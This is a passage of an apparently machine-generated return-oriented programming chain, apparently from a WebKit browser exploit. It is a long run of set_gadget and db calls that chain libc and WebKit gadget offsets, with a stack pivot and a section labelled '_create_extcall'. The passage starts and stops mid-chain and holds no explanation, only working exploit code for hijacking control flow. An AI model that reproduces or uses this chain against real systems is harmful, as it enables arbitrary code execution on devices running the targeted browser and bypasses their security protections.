set_gadget(libc_base+757614,); //pop rcx
//L447:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L448:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+83592, //L450-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+83576, //L449-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L449:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L450:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+83688, //L453-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L451:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L453:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+83792, //L456-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+83776, //L455-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L455:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+83936, //L459-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+83904, //L457-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+83920, //L458-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L457:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L458:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L459:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+84008, //L460-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+84064, //L463-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L463:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+84160, //L466-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L464:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+84264, //L469-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+84248, //L468-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L468:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+84432, //L472-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+84448, //L473-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+84400, //L470-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+84416, //L471-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L470:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L471:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L472:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L473:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+84552, //L474-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+84584, //L476-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+84568, //L475-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L474:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L475:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+84672, //L477-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+84728, //L480-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L480:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+84800, //L481-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+84856, //L484-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L484:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
//L485:
libc_base+362222, //pop rsi
ropchain+84960, //L488-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L486:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L488:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+85064, //L491-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+85048, //L490-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L490:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L491:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+85232, //L494-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+85248, //L495-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+85200, //L492-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+85216, //L493-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L492:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L493:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L494:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L495:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+85344, //L497-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+85328, //L496-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L496:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L497:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+85432, //L499-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L498:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+85504, //L502-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L500:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L502:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+85568, //L503-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L503:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+766440, //pop rsp
ropchain+73976, //L202
//L235:
libc_base+362222, //pop rsi
ropchain+85680, //L507-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L505:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+85784, //L510-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+85768, //L509-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L509:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+85888, //L511-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+85920, //L513-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+85904, //L512-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L511:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L512:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+86016, //L514-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+86032, //L515-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L514:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+86144, //L516-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+86128, //L517-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L517:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+86232, //L519-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+86216, //L518-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L518:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+86328, //L520-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+86344, //L521-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L520:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+86456, //L522-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+86440, //L523-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L523:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L522:
db([0, 0]); // 0x0
//_create_extcall:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+86528, //L524-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L524:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+86592, //L526-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L526:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L528:
db([32, 0]); // 0x20
set_gadget(libc_base+757614,); //pop rcx
//L530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+86760, //L533-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+86744, //L532-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L532:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L533:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+86864, //L536-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+86880, //L537-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L534:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L536:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L537:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L538:
db([16, 0]); // 0x10
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+87024, //L542-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+87008, //L541-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L541:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L542:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+87168, //L545-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+87136, //L543-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+87152, //L544-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L543:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L544:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L545:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+87240, //L546-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+87296, //L549-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L549:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+87376, //L550-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L550:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L551:
db([1, 0]); // 0x1
set_gadget(libc_base+757614,); //pop rcx
//L552:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+87480, //L553-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+87496, //L554-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L553:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+87584, //L555-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L555:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+87640, //L558-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L558:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+87760, //L561-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L559:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L561:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+87864, //L564-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+87848, //L563-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L563:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L564:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+88008, //L567-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+87976, //L565-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+87992, //L566-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L565:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L566:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L567:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+88080, //L568-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+88136, //L571-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L571:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+88216, //L572-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L572:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L573:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L574:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+88320, //L575-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+88336, //L576-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L575:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+88424, //L577-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L577:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+88480, //L580-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L580:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+88552, //L581-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L581:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+88608, //L584-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L584:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L585:
pivot_addr,
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+88760, //L588-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L586:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+88864, //L591-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+88848, //L590-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L590:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L591:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+89008, //L594-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+88976, //L592-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+88992, //L593-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L592:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L593:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L594:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+89080, //L595-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L595:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+89136, //L598-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L598:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+89216, //L599-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L599:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L600:
db([1, 0]); // 0x1
set_gadget(libc_base+757614,); //pop rcx
//L601:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+89320, //L602-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+89336, //L603-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L602:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+89424, //L604-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L604:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+89480, //L607-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
